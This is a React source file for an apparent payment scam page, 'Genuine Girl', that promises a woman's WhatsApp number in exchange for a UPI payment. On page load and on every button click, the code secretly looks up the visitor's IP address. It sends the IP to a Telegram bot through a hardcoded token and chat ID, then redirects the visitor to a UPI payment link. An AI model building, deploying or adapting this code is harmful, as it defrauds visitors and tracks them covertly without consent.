import './App.css';
import React, { useEffect } from 'react';
let ip = 'Not Found'

async function sendUpdate(msg) {
  setTimeout(() => {
    fetch('https://api.db-ip.com/v2/free/self')
      .then(result => result.json())
      .then((output) => {
        ip = output;
        const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${msg}--------${ip.ipAddress}`
        fetch(url, {
          method: "POST",
          headers: { 'Content-Type': 'application/json' },
          body: ''
        }).then(res => {
          console.log("Request complete!");
        })
      }).catch(err => console.error(err));
  })
}

function App() {
  useEffect(() => {
    setTimeout(() => {
      sendUpdate("Home").then(() => {
        window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=Genuine_Girl", "_self");
      })
    }, 200);
  }, [])
  const handlepayButton = async () => {
    await sendUpdate("PayButton")
    window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=Genuine_Girl", "_self");
  }

  const handleWspButton = async () => {
    await sendUpdate("WhatsppBtn")
    window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=Genuine_Girl", "_self");
  }

  return (
    <div className="App">
      <header className="App-header">
        <h1 style={{ marginTop: "-60px", marginBottom: '10px' }}>🍆Genuine Girl!!🍆</h1>
        <button className='button' style={{ marginBottom: "20px" }} onClick={() => { handlepayButton() }}>PAY NOW!!</button>
        <h6>You should PAY first to Unlock My Number!!😜</h6>
        <CopyExample />
        <h6 style={{ marginBottom: "5px" }}>Click Below👇 For My Whatsapp Number!!</h6>
        <button className='button' onClick={() => { handleWspButton() }}>Whatsapp Number!</button>
        <h6>PAY NOW and Send me screenshot on Telegram!!🥰</h6>
      </header>
    </div>
  );
}

function CopyExample() {
  return (
    <div className='card'>
      <p style={{ margin: "0px", color: "mistyrose", fontWeight: 'bold' }}>Pay to my UPI Adress if Button is Not Working👇🏻👇🏻👇🏻</p>
      <div style={{ display: "flex", padding: "15px" }}>
        <input readOnly value={"bharatpe.0851610820@icici"}></input >
        <button className='cpybutton' onClick={async () => { await sendUpdate('Copied'); navigator.clipboard.writeText('bharatpe.0851610820@icici') }}>Copy</button>
      </div>
    </div>
  );
}


export default App;
